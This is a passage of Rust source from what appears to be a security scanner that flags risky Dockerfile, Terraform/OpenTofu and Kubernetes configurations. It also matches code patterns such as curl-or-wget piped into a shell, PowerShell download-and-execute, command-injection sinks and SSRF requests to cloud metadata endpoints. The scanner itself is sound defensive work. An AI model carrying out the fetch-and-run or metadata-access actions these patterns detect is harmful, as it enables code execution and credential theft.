        if let Some((image, stage_name)) = parse_docker_from_line(trimmed) {
            final_stage_user = None;

            if let Some(stage_name) = stage_name {
                stage_names.insert(stage_name.to_ascii_lowercase());
            }

            let normalized_image = image.trim();
            if normalized_image.is_empty()
                || normalized_image.contains('$')
                || normalized_image.eq_ignore_ascii_case("scratch")
                || stage_names.contains(&normalized_image.to_ascii_lowercase())
                || normalized_image.contains("@sha256:")
            {
                continue;
            }

            let (severity, title, detail) = if normalized_image.ends_with(":latest")
                || !normalized_image.contains(':')
            {
                (
                    Severity::High,
                    "Dockerfile base image is mutable or implicitly latest",
                    "The candidate Dockerfile uses a base image without an immutable digest, and the selected image reference is effectively mutable.",
                )
            } else {
                (
                    Severity::Medium,
                    "Dockerfile base image is not pinned by digest",
                    "The candidate Dockerfile uses a tagged base image without an immutable digest. Tags can drift and change the reviewed build input over time.",
                )
            };

            findings.push(
                Finding::new(
                    "config.dockerfile.unpinned-base-image",
                    scanner,
                    severity,
                    Confidence::High,
                    FindingCategory::Configuration,
                    Some(file.to_path_buf()),
                    title,
                    detail,
                    "Pin production-facing base images to immutable digests so the reviewed build input cannot drift silently between builds.",
                    format!(
                        "config-dockerfile-unpinned-base-image:{}:{}",
                        file.display(),
                        normalized_image
                    ),
                )
                .with_line(line_number),
            );
            continue;
        }

        if let Some(user) = parse_docker_user_line(trimmed) {
            final_stage_user = Some((user, line_number));
            continue;
        }

        if let Some(finding) =
            scan_docker_remote_pipe_installer(scanner, file, line_number, trimmed)
        {
            findings.push(finding);
        }

        if let Some(finding) =
            scan_docker_remote_download_execution(scanner, file, line_number, trimmed)
        {
            findings.push(finding);
        }

        if let Some(finding) = scan_docker_remote_add_source(scanner, file, line_number, trimmed) {
            findings.push(finding);
        }
    }

    if let Some((user, line_number)) = final_stage_user {
        if is_explicit_root_docker_user(&user) {
            findings.push(
                Finding::new(
                    "config.dockerfile.final-stage-root-user",
                    scanner,
                    Severity::Medium,
                    Confidence::High,
                    FindingCategory::Configuration,
                    Some(file.to_path_buf()),
                    "Dockerfile final runtime stage explicitly runs as root",
                    format!(
                        "The candidate Dockerfile leaves the final runtime stage on explicit user `{user}`, which keeps the container running with root-equivalent privileges by default."
                    ),
                    "Prefer a dedicated non-root runtime user in the final image stage unless root is narrowly justified and documented.",
                    format!("config-dockerfile-final-stage-root-user:{}:{}", file.display(), user),
                )
                .with_line(line_number),
            );
        }
    }

    findings
}

fn scan_docker_remote_pipe_installer(
    scanner: &'static str,
    file: &Path,
    line_number: usize,
    line: &str,
) -> Option<Finding> {
    let lowered = line.to_ascii_lowercase();
    let command = lowered
        .strip_prefix("run ")
        .or_else(|| lowered.strip_prefix("run\t"))?;
    let fetches_remote_content = (command.contains("curl ")
        || command.contains("wget ")
        || command.contains("invoke-webrequest")
        || command.contains("iwr "))
        && (command.contains("http://") || command.contains("https://"));
    if !fetches_remote_content || !command.contains('|') || !docker_pipeline_executes_shell(command)
    {
        return None;
    }

    Some(
        Finding::new(
            "config.dockerfile.remote-pipe-installer",
            scanner,
            Severity::High,
            Confidence::High,
            FindingCategory::Configuration,
            Some(file.to_path_buf()),
            "Dockerfile downloads remote content and pipes it into a shell",
            "The candidate Dockerfile appears to fetch remote content with a network client and pipe it directly into a shell during build. That reduces reviewability and turns network-delivered content into immediate build-time code execution.",
            "Download installers as explicit reviewed assets, verify them before execution, or replace the remote pipe with a pinned package or checksum-verified artifact flow.",
            format!("config-dockerfile-remote-pipe-installer:{}:{}", file.display(), line_number),
        )
        .with_line(line_number),
    )
}

fn scan_docker_remote_download_execution(
    scanner: &'static str,
    file: &Path,
    line_number: usize,
    line: &str,
) -> Option<Finding> {
    let lowered = line.to_ascii_lowercase();
    let command = lowered
        .strip_prefix("run ")
        .or_else(|| lowered.strip_prefix("run\t"))?;
    let fetches_remote_content = (command.contains("curl ")
        || command.contains("wget ")
        || command.contains("invoke-webrequest")
        || command.contains("iwr "))
        && (command.contains("http://") || command.contains("https://"));
    if !fetches_remote_content || command.contains('|') {
        return None;
    }

    let executes_downloaded_payload = ["&& sh ", "&& bash ", "&& /bin/sh", "&& /bin/bash"]
        .iter()
        .any(|needle| command.contains(needle))
        || (command.contains("&& chmod +x")
            && command
                .split("&&")
                .skip(1)
                .any(|segment| segment.contains("./")));
    if !executes_downloaded_payload {
        return None;
    }

    Some(
        Finding::new(
            "config.dockerfile.remote-download-execution",
            scanner,
            Severity::High,
            Confidence::High,
            FindingCategory::Configuration,
            Some(file.to_path_buf()),
            "Dockerfile downloads remote content and executes it in one build step",
            "The candidate Dockerfile appears to fetch remote content and then execute the downloaded payload within the same `RUN` step. That makes remote installer behavior part of the live build trust boundary without an explicit reviewable verification step.",
            "Split remote downloads from execution, verify checksums or signatures explicitly, or replace the fetch-and-run path with a pinned package or reviewed vendored asset.",
            format!(
                "config-dockerfile-remote-download-execution:{}:{}",
                file.display(),
                line_number
            ),
        )
        .with_line(line_number),
    )
}

fn scan_docker_remote_add_source(
    scanner: &'static str,
    file: &Path,
    line_number: usize,
    line: &str,
) -> Option<Finding> {
    let trimmed = line.trim();
    let remainder = trimmed
        .strip_prefix("ADD ")
        .or_else(|| trimmed.strip_prefix("add "))?;
    let source = remainder.split_whitespace().next().unwrap_or_default();
    if !source.starts_with("http://") && !source.starts_with("https://") {
        return None;
    }

    Some(
        Finding::new(
            "config.dockerfile.remote-add-source",
            scanner,
            Severity::Medium,
            Confidence::High,
            FindingCategory::Configuration,
            Some(file.to_path_buf()),
            "Dockerfile uses a remote ADD source",
            "The candidate Dockerfile uses `ADD` with a remote URL, which pulls opaque remote content directly into the image build without an explicit verification step.",
            "Prefer reviewed local build inputs or download remote assets through an explicit checksum- or signature-verified build step.",
            format!(
                "config-dockerfile-remote-add-source:{}:{}",
                file.display(),
                line_number
            ),
        )
        .with_line(line_number),
    )
}

fn scan_terraform_iac_config(scanner: &'static str, file: &Path, contents: &str) -> Vec<Finding> {
    let mut findings = Vec::new();
    let lower = contents.to_ascii_lowercase();

    if let Some(line_number) = find_first_line(
        contents,
        &[
            "acl = \"public-read\"",
            "acl = \"public-read-write\"",
            "predefined_acl = \"publicread\"",
            "predefined_acl = \"publicreadwrite\"",
            "block_public_acls = false",
            "block_public_policy = false",
            "ignore_public_acls = false",
            "restrict_public_buckets = false",
        ],
    ) {
        findings.push(
            Finding::new(
                "config.terraform.public-storage",
                scanner,
                Severity::High,
                Confidence::High,
                FindingCategory::Configuration,
                Some(file.to_path_buf()),
                "Terraform or OpenTofu config appears to allow public object storage exposure",
                "The candidate Terraform or OpenTofu change appears to weaken object-storage public-access protections through public ACLs or disabled public-access blocking controls.",
                "Keep bucket and object storage surfaces private by default, enable public-access blocking, and require deliberate reviewed exceptions for any public exposure.",
                format!("config-terraform-public-storage:{}", file.display()),
            )
            .with_line(line_number),
        );
    }

    if lower.contains("backend \"s3\"") {
        if let Some(line_number) = find_first_line(contents, &["encrypt = false"]) {
            findings.push(
                Finding::new(
                    "config.terraform.backend.s3-encryption-disabled",
                    scanner,
                    Severity::High,
                    Confidence::High,
                    FindingCategory::Configuration,
                    Some(file.to_path_buf()),
                    "Terraform or OpenTofu S3 backend disables state encryption",
                    "The candidate Terraform or OpenTofu configuration sets `encrypt = false` inside an S3 backend block. That weakens the default protection of remote state, which can contain credentials, infrastructure inventory, and other sensitive material.",
                    "Keep remote state encryption enabled for S3-backed state storage and require a tightly reviewed exception before disabling it.",
                    format!("config-terraform-backend-s3-encryption-disabled:{}", file.display()),
                )
                .with_line(line_number),
            );
        }
    }

    if lower.contains("backend \"http\"") {
        if let Some(line_number) = find_first_line(contents, &["address = \"http://"]) {
            findings.push(
                Finding::new(
                    "config.terraform.backend.insecure-http",
                    scanner,
                    Severity::High,
                    Confidence::High,
                    FindingCategory::Configuration,
                    Some(file.to_path_buf()),
                    "Terraform or OpenTofu backend uses insecure HTTP transport",
                    "The candidate Terraform or OpenTofu configuration points a remote state backend at an `http://` address. State backends often carry sensitive infrastructure metadata and lock coordination, so cleartext transport weakens both confidentiality and integrity.",
                    "Use HTTPS for remote state backends and keep state transport on authenticated, encrypted channels only.",
                    format!("config-terraform-backend-insecure-http:{}", file.display()),
                )
                .with_line(line_number),
            );
        }
    }

    findings.extend(scan_terraform_sensitive_false_blocks(
        scanner, file, contents,
    ));
    findings.extend(scan_terraform_inline_secret_attributes(
        scanner, file, contents,
    ));

    if let Some(line_number) = find_first_line(
        contents,
        &[
            "\"principal\": \"*\"",
            "\"aws\": \"*\"",
            "identifiers = [\"*\"]",
            "principals = [\"*\"]",
            "principal = \"*\"",
        ],
    ) {
        findings.push(
            Finding::new(
                "config.terraform.iam.wildcard-principal",
                scanner,
                Severity::High,
                Confidence::High,
                FindingCategory::Configuration,
                Some(file.to_path_buf()),
                "Terraform or OpenTofu IAM policy uses a wildcard principal",
                "The candidate Terraform or OpenTofu change appears to grant access to a wildcard principal. That opens a trust boundary far beyond a narrowly reviewed identity set.",
                "Replace wildcard principals with the smallest explicit trusted identities or federated subjects that the workload actually needs.",
                format!("config-terraform-wildcard-principal:{}", file.display()),
            )
            .with_line(line_number),
        );
    }

    if let Some(line_number) = find_first_line(
        contents,
        &[
            "\"action\": \"*\"",
            "\"resource\": \"*\"",
            "actions = [\"*\"]",
            "resources = [\"*\"]",
        ],
    ) {
        findings.push(
            Finding::new(
                "config.terraform.iam.wildcard-actions",
                scanner,
                Severity::High,
                Confidence::Medium,
                FindingCategory::Configuration,
                Some(file.to_path_buf()),
                "Terraform or OpenTofu IAM policy uses wildcard actions or resources",
                "The candidate Terraform or OpenTofu change appears to declare wildcard IAM actions or resources. That makes the resulting permission surface difficult to reason about and easy to over-grant.",
                "Replace wildcard IAM actions and resources with a narrowly scoped allowlist that matches the reviewed workload behavior.",
                format!("config-terraform-wildcard-actions:{}", file.display()),
            )
            .with_line(line_number),
        );
    }
    let exposes_admin_port = contents.lines().any(|line| {
        let line = line.to_ascii_lowercase();
        (line.contains("from_port") || line.contains("to_port"))
            && (line.contains("22") || line.contains("3389"))
    });
    let sensitive_service_ports = [
        "5432", "3306", "6379", "27017", "9200", "5601", "9090", "9093", "11211", "2375", "2376",
        "6443",
    ];
    let exposes_sensitive_service_port = contents.lines().any(|line| {
        let line = line.to_ascii_lowercase();
        (line.contains("from_port") || line.contains("to_port"))
            && sensitive_service_ports
                .iter()
                .any(|port| line.contains(port))
    });
    let exposes_all_ports = contents.lines().any(|line| {
        let line = line.to_ascii_lowercase();
        (line.contains("from_port") && line.contains("0"))
            || (line.contains("to_port") && (line.contains("0") || line.contains("65535")))
    }) && contents.lines().any(|line| {
        let line = line.to_ascii_lowercase();
        line.contains("protocol") && (line.contains("\"-1\"") || line.contains("= -1"))
    });

    if lower.contains("0.0.0.0/0") && exposes_admin_port {
        let line_number = find_first_line(contents, &["0.0.0.0/0"]).unwrap_or(1);
        findings.push(
            Finding::new(
                "config.terraform.public-admin-ingress",
                scanner,
                Severity::High,
                Confidence::High,
                FindingCategory::Configuration,
                Some(file.to_path_buf()),
                "Terraform or OpenTofu security rule exposes an administrative port publicly",
                "The candidate Terraform or OpenTofu change appears to expose SSH or RDP to `0.0.0.0/0`. Public administrative ingress is a common path to credential spraying and infrastructure compromise.",
                "Close public administrative ingress and route operational access through a bastion, VPN, or tightly allowlisted management network.",
                format!("config-terraform-public-admin-ingress:{}", file.display()),
            )
            .with_line(line_number),
        );
    }

    if lower.contains("0.0.0.0/0") && exposes_sensitive_service_port {
        let line_number = find_first_line(contents, &["0.0.0.0/0"]).unwrap_or(1);
        findings.push(
            Finding::new(
                "config.terraform.public-sensitive-service-ingress",
                scanner,
                Severity::High,
                Confidence::High,
                FindingCategory::Configuration,
                Some(file.to_path_buf()),
                "Terraform or OpenTofu security rule exposes a sensitive service port publicly",
                "The candidate Terraform or OpenTofu change appears to expose a database, cache, observability, cluster-control, or daemon port to `0.0.0.0/0`. Public reachability on these service ports often creates an immediate path to data exposure, abuse, or infrastructure takeover.",
                "Restrict the service to private network ranges, a tightly allowlisted management plane, or an internal load-balancing path instead of public ingress.",
                format!("config-terraform-public-sensitive-service-ingress:{}", file.display()),
            )
            .with_line(line_number),
        );
    }

    if lower.contains("0.0.0.0/0") && exposes_all_ports {
        let line_number = find_first_line(contents, &["0.0.0.0/0"]).unwrap_or(1);
        findings.push(
            Finding::new(
                "config.terraform.public-all-ports-ingress",
                scanner,
                Severity::High,
                Confidence::High,
                FindingCategory::Configuration,
                Some(file.to_path_buf()),
                "Terraform or OpenTofu security rule exposes broad ingress publicly",
                "The candidate Terraform or OpenTofu change appears to expose `0.0.0.0/0` with all protocols or an effectively all-ports rule. That creates a broad internet-facing attack surface that is difficult to justify for ordinary workloads.",
                "Replace the broad public rule with narrowly scoped ports and explicitly allowlisted source ranges, or move the service behind a reviewed ingress layer.",
                format!("config-terraform-public-all-ports-ingress:{}", file.display()),
            )
            .with_line(line_number),
        );
    }

    findings
}

fn scan_terraform_sensitive_false_blocks(
    scanner: &'static str,
    file: &Path,
    contents: &str,
) -> Vec<Finding> {
    let mut findings = Vec::new();
    let mut current_block = None;

    for (index, line) in contents.lines().enumerate() {
        let line_number = index + 1;
        let trimmed = strip_inline_comment(line).trim();
        if trimmed.is_empty() {
            continue;
        }

        if current_block.is_none() {
            if let Some((kind, name)) = parse_terraform_sensitive_named_block_header(trimmed) {
                let depth = terraform_brace_delta(trimmed).max(1);
                current_block = Some(TerraformSensitiveBlock {
                    kind,
                    name,
                    depth,
                    flagged: false,
                });
            }
            continue;
        }

        let mut should_clear = false;

        if let Some(block) = current_block.as_mut() {
            if !block.flagged
                && is_sensitive_identifier(&normalize_identifier(&block.name))
                && terraform_sensitive_false_assignment(trimmed)
            {
                let (id, title, detail, remediation, severity) = match block.kind {
                    TerraformSensitiveBlockKind::Output => (
                        "config.terraform.output.secret-sensitive-false",
                        "Terraform or OpenTofu secret-bearing output disables sensitivity masking",
                        format!(
                            "The candidate Terraform or OpenTofu output `{}` appears secret-bearing but explicitly sets `sensitive = false`. That can expose the value in plans, CLI output, and downstream tooling surfaces.",
                            block.name
                        ),
                        "Mark secret-bearing outputs as sensitive or keep them out of operator-facing outputs entirely.",
                        Severity::High,
                    ),
                    TerraformSensitiveBlockKind::Variable => (
                        "config.terraform.variable.secret-sensitive-false",
                        "Terraform or OpenTofu secret-bearing variable disables sensitivity masking",
                        format!(
                            "The candidate Terraform or OpenTofu variable `{}` appears secret-bearing but explicitly sets `sensitive = false`. That weakens masking for a value that is likely to require additional handling care in plans and operator workflows.",
                            block.name
                        ),
                        "Keep secret-bearing variables marked sensitive so plans and operator tooling do not treat them like ordinary values.",
                        Severity::Medium,
                    ),
                };

                findings.push(
                    Finding::new(
                        id,
                        scanner,
                        severity,
                        Confidence::High,
                        FindingCategory::Configuration,
                        Some(file.to_path_buf()),
                        title,
                        detail,
                        remediation,
                        format!(
                            "config-terraform-sensitive-false:{}:{}:{}",
                            file.display(),
                            match block.kind {
                                TerraformSensitiveBlockKind::Output => "output",
                                TerraformSensitiveBlockKind::Variable => "variable",
                            },
                            block.name
                        ),
                    )
                    .with_line(line_number),
                );
                block.flagged = true;
            }

            block.depth += terraform_brace_delta(trimmed);
            if block.depth <= 0 {
                should_clear = true;
            }
        }

        if should_clear {
            current_block = None;
        }
    }

    findings
}

fn scan_terraform_inline_secret_attributes(
    scanner: &'static str,
    file: &Path,
    contents: &str,
) -> Vec<Finding> {
    let mut findings = Vec::new();

    for (index, line) in contents.lines().enumerate() {
        let line_number = index + 1;
        let stripped = strip_inline_comment(line).trim();
        if stripped.is_empty() {
            continue;
        }

        let Some((key, raw_value)) = extract_assignment(stripped) else {
            continue;
        };
        let normalized_key = normalize_identifier(&key);
        if !terraform_sensitive_attribute_key(&normalized_key) {
            continue;
        }

        let trimmed_value = raw_value.trim_matches(',').trim();
        if !trimmed_value.starts_with('"') && !trimmed_value.starts_with('\'') {
            continue;
        }

        let value = trim_wrapping_quotes(trimmed_value);
        if value.len() < 6
            || looks_like_placeholder(value)
            || looks_like_template_expression(value)
            || value.eq_ignore_ascii_case("true")
            || value.eq_ignore_ascii_case("false")
            || value.eq_ignore_ascii_case("null")
        {
            continue;
        }

        findings.push(
            Finding::new(
                "config.terraform.inline-secret-attribute",
                scanner,
                Severity::High,
                Confidence::High,
                FindingCategory::Configuration,
                Some(file.to_path_buf()),
                "Terraform or OpenTofu config embeds a literal secret attribute",
                format!(
                    "The candidate Terraform or OpenTofu change assigns a literal value directly to secret-bearing attribute `{key}`. Inline infrastructure secrets can leak through plans, state, logs, and review surfaces."
                ),
                "Move the secret to a dedicated secret manager, sensitive variable, or runtime injection path instead of embedding the literal directly in Terraform or OpenTofu config.",
                format!(
                    "config-terraform-inline-secret-attribute:{}:{}",
                    file.display(),
                    normalized_key
                ),
            )
            .with_line(line_number),
        );
    }

    findings
}

fn looks_like_kubernetes_manifest(contents: &str) -> bool {
    let lower = contents.to_ascii_lowercase();
    lower.contains("apiversion:")
        && lower.contains("kind:")
        && (lower.contains("metadata:") || lower.contains("spec:"))
}

fn scan_kubernetes_runtime_config(
    scanner: &'static str,
    file: &Path,
    contents: &str,
) -> Vec<Finding> {
    let lower = contents.to_ascii_lowercase();
    if !looks_like_kubernetes_manifest(contents) {
        return Vec::new();
    }

    let mut findings = Vec::new();
    let is_rbac = lower.contains("kind: role") || lower.contains("kind: clusterrole");

    if is_rbac
        && (lower.contains("verbs: [\"*\"]")
            || lower.contains("resources: [\"*\"]")
            || lower.contains("apigroups: [\"*\"]")
            || lower.contains("- \"*\""))
    {
        let line_number = find_first_line(
            contents,
            &[
                "verbs: [\"*\"]",
                "resources: [\"*\"]",
                "apiGroups: [\"*\"]",
                "- \"*\"",
            ],
        )
        .unwrap_or(1);
        findings.push(
            Finding::new(
                "config.kubernetes.rbac-wildcard",
                scanner,
                Severity::High,
                Confidence::High,
                FindingCategory::Configuration,
                Some(file.to_path_buf()),
                "Kubernetes RBAC manifest uses wildcard permissions",
                "The candidate Kubernetes Role or ClusterRole appears to grant wildcard verbs, resources, or API groups. That creates a broad permission surface that is hard to constrain or review.",
                "Replace wildcard RBAC grants with the narrowest verbs and resources the workload actually requires.",
                format!("config-kubernetes-rbac-wildcard:{}", file.display()),
            )
            .with_line(line_number),
        );
    }

    if lower.contains("kind: clusterrolebinding") && lower.contains("name: cluster-admin") {
        let line_number = find_first_line(contents, &["name: cluster-admin"]).unwrap_or(1);
        findings.push(
            Finding::new(
                "config.kubernetes.cluster-admin-binding",
                scanner,
                Severity::High,
                Confidence::High,
                FindingCategory::Configuration,
                Some(file.to_path_buf()),
                "Kubernetes binding grants cluster-admin",
                "The candidate Kubernetes binding appears to attach a subject directly to `cluster-admin`, which is usually broader than a reviewed workload should need.",
                "Replace `cluster-admin` with a narrowly scoped ClusterRole or Role that grants only the required capabilities.",
                format!("config-kubernetes-cluster-admin-binding:{}", file.display()),
            )
            .with_line(line_number),
        );
    }

    for (needle, id, title, detail, remediation, severity) in [
        (
            "privileged: true",
            "config.kubernetes.privileged-pod",
            "Kubernetes workload enables privileged container mode",
            "The candidate Kubernetes workload appears to enable `privileged: true`, which grants the container broad host-level capabilities.",
            "Drop privileged mode and keep the workload inside a restricted pod security posture.",
            Severity::High,
        ),
        (
            "allowPrivilegeEscalation: true",
            "config.kubernetes.allow-privilege-escalation",
            "Kubernetes workload allows privilege escalation",
            "The candidate Kubernetes workload appears to allow privilege escalation. That weakens one of the standard container hardening controls.",
            "Set `allowPrivilegeEscalation: false` unless there is a narrowly reviewed runtime requirement.",
            Severity::High,
        ),
        (
            "runAsNonRoot: false",
            "config.kubernetes.run-as-root",
            "Kubernetes workload explicitly allows running as root",
            "The candidate Kubernetes workload explicitly sets `runAsNonRoot: false`, which weakens the pod's default runtime hardening posture.",
            "Set `runAsNonRoot: true` and ensure the image and entrypoint can run without root privileges.",
            Severity::Medium,
        ),
        (
            "hostPath:",
            "config.kubernetes.hostpath-volume",
            "Kubernetes workload mounts a hostPath volume",
            "The candidate Kubernetes manifest uses `hostPath`, which creates a direct host filesystem trust boundary inside the pod.",
            "Replace `hostPath` with a safer storage abstraction or keep the mount narrowly reviewed and scoped.",
            Severity::High,
        ),
    ] {
        if let Some(line_number) = find_first_line(contents, &[needle]) {
            findings.push(
                Finding::new(
                    id,
                    scanner,
                    severity,
                    Confidence::High,
                    FindingCategory::Configuration,
                    Some(file.to_path_buf()),
                    title,
                    detail,
                    remediation,
                    format!("config-kubernetes:{}:{}", needle, file.display()),
                )
                .with_line(line_number),
            );
        }
    }

    if let Some(line_number) = find_first_line(
        contents,
        &["hostNetwork: true", "hostPID: true", "hostIPC: true"],
    ) {
        findings.push(
            Finding::new(
                "config.kubernetes.host-namespace",
                scanner,
                Severity::High,
                Confidence::High,
                FindingCategory::Configuration,
                Some(file.to_path_buf()),
                "Kubernetes workload shares a host namespace",
                "The candidate Kubernetes workload appears to enable host namespace sharing such as `hostNetwork`, `hostPID`, or `hostIPC`. That increases the pod's reach into the underlying node and neighboring workloads.",
                "Disable host namespace sharing unless the workload has a narrowly reviewed platform requirement.",
                format!("config-kubernetes-host-namespace:{}", file.display()),
            )
            .with_line(line_number),
        );
    }

    if lower.contains("kind: ingress") {
        if let Some(line_number) = find_first_line(
            contents,
            &[
                "nginx.ingress.kubernetes.io/ssl-redirect: \"false\"",
                "nginx.ingress.kubernetes.io/ssl-redirect: 'false'",
                "nginx.ingress.kubernetes.io/ssl-redirect: false",
                "nginx.ingress.kubernetes.io/force-ssl-redirect: \"false\"",
                "nginx.ingress.kubernetes.io/force-ssl-redirect: 'false'",
                "nginx.ingress.kubernetes.io/force-ssl-redirect: false",
            ],
        ) {
            findings.push(
                Finding::new(
                    "config.kubernetes.ingress-tls-redirect-disabled",
                    scanner,
                    Severity::Medium,
                    Confidence::High,
                    FindingCategory::Configuration,
                    Some(file.to_path_buf()),
                    "Kubernetes Ingress disables HTTPS redirect",
                    "The candidate Kubernetes Ingress explicitly disables HTTPS redirect behavior through ingress-controller annotations. That can leave the application reachable over cleartext HTTP even when the route is meant to be internet-facing.",
                    "Keep HTTPS redirect enabled for public ingress unless there is a tightly reviewed exception and a compensating network control.",
                    format!("config-kubernetes-ingress-tls-redirect-disabled:{}", file.display()),
                )
                .with_line(line_number),
            );
        }

        if !kubernetes_ingress_has_source_allowlist(contents) {
            if let Some((line_number, path)) = find_sensitive_kubernetes_ingress_path(contents) {
                findings.push(
                    Finding::new(
                        "config.kubernetes.ingress-sensitive-path",
                        scanner,
                        Severity::Medium,
                        Confidence::Medium,
                        FindingCategory::Configuration,
                        Some(file.to_path_buf()),
                        "Kubernetes Ingress exposes a sensitive path without a visible source allowlist",
                        format!(
                            "The candidate Kubernetes Ingress exposes sensitive path `{path}` but does not show a visible source-range allowlist annotation. Administrative and observability routes often need tighter ingress scoping than ordinary application traffic."
                        ),
                        "Restrict sensitive ingress paths behind an explicit source-range allowlist, stronger authentication, or an internal-only ingress surface.",
                        format!("config-kubernetes-ingress-sensitive-path:{}:{}", file.display(), path),
                    )
                    .with_line(line_number),
                );
            }
        }
    }

    if lower.contains("kind: namespace") {
        if let Some(line_number) = find_first_line(
            contents,
            &[
                "pod-security.kubernetes.io/enforce: privileged",
                "pod-security.kubernetes.io/enforce: \"privileged\"",
                "pod-security.kubernetes.io/enforce: 'privileged'",
            ],
        ) {
            findings.push(
                Finding::new(
                    "config.kubernetes.pod-security-privileged",
                    scanner,
                    Severity::High,
                    Confidence::High,
                    FindingCategory::Configuration,
                    Some(file.to_path_buf()),
                    "Kubernetes namespace enforces privileged Pod Security posture",
                    "The candidate Kubernetes namespace sets Pod Security admission enforcement to `privileged`, which disables the baseline hardening expectation for workloads admitted into that namespace.",
                    "Prefer `baseline` or `restricted` Pod Security enforcement for application namespaces unless a narrowly scoped platform namespace requires privileged workloads.",
                    format!("config-kubernetes-pod-security-privileged:{}", file.display()),
                )
                .with_line(line_number),
            );
        }
    }

    if lower.contains("kind: validatingwebhookconfiguration")
        || lower.contains("kind: mutatingwebhookconfiguration")
    {
        if let Some(line_number) = find_first_line(contents, &["failurePolicy: Ignore"]) {
            findings.push(
                Finding::new(
                    "config.kubernetes.admission-webhook-failure-ignore",
                    scanner,
                    Severity::High,
                    Confidence::High,
                    FindingCategory::Configuration,
                    Some(file.to_path_buf()),
                    "Kubernetes admission webhook ignores failures",
                    "The candidate admission webhook configuration uses `failurePolicy: Ignore`, which allows requests to continue when the webhook is unavailable or errors out. That weakens the intended admission-policy enforcement path.",
                    "Use `failurePolicy: Fail` for security-relevant admission checks unless the fail-open behavior is narrowly justified and compensating controls exist.",
                    format!("config-kubernetes-admission-webhook-failure-ignore:{}", file.display()),
                )
                .with_line(line_number),
            );
        }
    }

    findings
}

fn kubernetes_ingress_has_source_allowlist(contents: &str) -> bool {
    let lower = contents.to_ascii_lowercase();
    lower.contains("whitelist-source-range")
        || lower.contains("allowlist-source-range")
        || lower.contains("inbound-cidrs")
        || lower.contains("haproxy.org/whitelist")
}

fn find_sensitive_kubernetes_ingress_path(contents: &str) -> Option<(usize, &'static str)> {
    let needles = [
        "/admin",
        "/metrics",
        "/debug",
        "/actuator",
        "/prometheus",
        "/grafana",
        "/kibana",
    ];

    contents.lines().enumerate().find_map(|(index, line)| {
        let trimmed = line.trim().to_ascii_lowercase();
        if !trimmed.starts_with("path:") && !trimmed.starts_with("- path:") {
            return None;
        }

        needles
            .iter()
            .find_map(|needle| trimmed.contains(needle).then_some((index + 1, *needle)))
    })
}

fn scan_remote_script_execution(
    scanner: &'static str,
    file: &Path,
    line_number: usize,
    line: &str,
) -> Option<Finding> {
    let lowered = line.to_ascii_lowercase();

    let matches_unix_pattern = (lowered.contains("curl ") || lowered.contains("wget "))
        && ["| sh", "|sh", "| bash", "|bash", "| zsh", "|zsh"]
            .iter()
            .any(|needle| lowered.contains(needle));
    let matches_powershell_pattern = (lowered.contains("invoke-webrequest")
        || lowered.contains("irm "))
        && ["| iex", "|iex", "; iex", ";iex"]
            .iter()
            .any(|needle| lowered.contains(needle));

    if !matches_unix_pattern && !matches_powershell_pattern {
        return None;
    }

    let severity = if is_execution_surface(file) {
        Severity::High
    } else {
        Severity::Medium
    };

    Some(
        Finding::new(
            "sast.remote-script.execution",
            scanner,
            severity,
            Confidence::High,
            FindingCategory::Vulnerability,
            Some(file.to_path_buf()),
            "Remote script execution pattern detected",
            "The candidate file appears to download remote content and pipe it directly into an execution surface such as a shell or PowerShell interpreter.",
            "Pin and verify downloaded artifacts before execution, or replace the pattern with a reviewed package-manager or checksum-verified installation flow.",
            format!("sast-remote-script:{}:{}", file.display(), line_number),
        )
        .with_line(line_number),
    )
}

fn scan_command_injection_pattern(
    scanner: &'static str,
    file: &Path,
    line_number: usize,
    line: &str,
) -> Option<Finding> {
    let lower = line.to_ascii_lowercase();
    if !line_uses_untrusted_input(&lower) {
        return None;
    }

    let detail = if is_javascript_like(file)
        && (lower.contains("exec(") || lower.contains("execsync("))
    {
        Some(
            "The candidate file appears to feed request or CLI-controlled input into a JavaScript command-execution sink.",
        )
    } else if is_python_like(file)
        && (lower.contains("os.system(")
            || ((lower.contains("subprocess.run(")
                || lower.contains("subprocess.popen(")
                || lower.contains("subprocess.call(")
                || lower.contains("subprocess.check_output("))
                && lower.contains("shell=true")))
    {
        Some(
            "The candidate file appears to feed request or CLI-controlled input into a Python shell-command execution path.",
        )
    } else if is_java_like(file) && lower.contains("runtime.getruntime().exec(") {
        Some(
            "The candidate file appears to feed request or argument-controlled input into a JVM command-execution sink.",
        )
    } else if is_php_like(file)
        && ["shell_exec(", "exec(", "system(", "passthru(", "proc_open("]
            .iter()
            .any(|needle| lower.contains(needle))
    {
        Some(
            "The candidate file appears to feed request-controlled input into a PHP command-execution sink.",
        )
    } else if is_ruby_like(file)
        && ["system(", "exec(", "open3.capture", "open3.popen", "%x("]
            .iter()
            .any(|needle| lower.contains(needle))
    {
        Some(
            "The candidate file appears to feed request or argument-controlled input into a Ruby command-execution sink.",
        )
    } else {
        None
    }?;

    Some(
        Finding::new(
            "sast.command-injection.untrusted-input",
            scanner,
            Severity::High,
            Confidence::High,
            FindingCategory::Vulnerability,
            Some(file.to_path_buf()),
            "Untrusted input reaches a command execution sink",
            detail,
            "Avoid building shell commands from request or CLI-controlled data. Prefer allowlisted arguments, structured subprocess APIs, and strict input validation.",
            format!("sast-command-injection:{}:{}", file.display(), line_number),
        )
        .with_line(line_number),
    )
}

fn scan_ssrf_pattern(
    scanner: &'static str,
    file: &Path,
    line_number: usize,
    line: &str,
) -> Option<Finding> {
    let lower = line.to_ascii_lowercase();
    let is_http_client_sink = (is_javascript_like(file)
        && ["fetch(", "axios(", "axios.get(", "axios.post(", "got("]
            .iter()
            .any(|needle| lower.contains(needle)))
        || (is_python_like(file)
            && [
                "requests.get(",
                "requests.post(",
                "requests.request(",
                "httpx.get(",
                "httpx.post(",
                "httpx.request(",
                "urllib.request.urlopen(",
            ]
            .iter()
            .any(|needle| lower.contains(needle)))
        || (is_go_like(file)
            && ["http.get(", "http.post(", "http.newrequest("]
                .iter()
                .any(|needle| lower.contains(needle)))
        || (is_php_like(file)
            && ["curl_init(", "file_get_contents("]
                .iter()
                .any(|needle| lower.contains(needle)));
    if !is_http_client_sink {
        return None;
    }

    if lower.contains("169.254.169.254")
        || lower.contains("metadata.google.internal")
        || lower.contains("/latest/meta-data")
        || lower.contains("/computeMetadata/")
    {
        return Some(
            Finding::new(
                "sast.ssrf.cloud-metadata-access",
                scanner,
                Severity::High,
                Confidence::High,
                FindingCategory::Vulnerability,
                Some(file.to_path_buf()),
                "Outbound request targets a cloud metadata endpoint",
                "The candidate file appears to make an outbound request to a cloud instance metadata service endpoint, which is a common SSRF escalation target.",
